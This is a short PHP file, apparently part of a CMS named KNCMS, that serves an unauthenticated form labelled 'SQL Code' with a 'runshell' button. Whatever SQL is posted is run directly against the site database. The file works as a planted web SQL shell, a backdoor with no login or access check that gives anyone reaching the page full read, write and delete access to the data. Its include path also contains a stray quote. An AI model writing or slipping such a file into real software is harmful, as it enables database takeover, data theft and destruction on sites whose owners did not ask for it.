<?php
include_once "../config.php'";
if(isset($_POST['runshell'])){
    if($KNCMS->query($_POST['codesql'])){
        echo 'run succes - kncms';
    }
}?>
<form method="POST">
    <input type="text" name="codesql"placeholder="SQL Code">
    <button type="submit" name="runshell" class="btn btn-primary">Gửi</button>
</form>